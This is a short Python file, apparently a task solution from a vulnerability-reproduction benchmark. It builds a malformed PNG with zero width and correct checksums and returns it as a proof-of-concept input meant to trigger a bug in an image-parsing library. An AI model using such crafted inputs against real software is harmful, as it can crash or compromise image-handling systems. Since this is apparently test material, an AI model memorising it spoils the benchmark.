import binascii
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b'\x89PNG\r\n\x1a\n'
        width = 0
        height = 1
        bit_depth = 8
        color_type = 0  # grayscale
        compression = 0
        filter_method = 0
        interlace = 0
        ihdr_data = (
            width.to_bytes(4, 'big') +
            height.to_bytes(4, 'big') +
            bytes([bit_depth]) +
            bytes([color_type]) +
            bytes([compression]) +
            bytes([filter_method]) +
            bytes([interlace])
        )
        crc_input = b'IHDR' + ihdr_data
        crc = binascii.crc32(crc_input) & 0xffffffff
        ihdr_length = len(ihdr_data).to_bytes(4, 'big')
        ihdr_chunk = ihdr_length + b'IHDR' + ihdr_data + crc.to_bytes(4, 'big')
        # IDAT with compressed scanline data (1 byte for filter)
        pixel_data = b'\x00'  # none filter, no pixels
        compressed = zlib.compress(pixel_data)
        idat_data = compressed
        crc_input_idat = b'IDAT' + idat_data
        crc_idat = binascii.crc32(crc_input_idat) & 0xffffffff
        idat_length = len(idat_data).to_bytes(4, 'big')
        idat_chunk = idat_length + b'IDAT' + idat_data + crc_idat.to_bytes(4, 'big')
        # IEND
        iend_length = b'\x00\x00\x00\x00'
        iend_crc_input = b'IEND'
        iend_crc = binascii.crc32(iend_crc_input) & 0xffffffff
        iend_chunk = iend_length + b'IEND' + iend_crc.to_bytes(4, 'big')
        poc = sig + ihdr_chunk + idat_chunk + iend_chunk
        return poc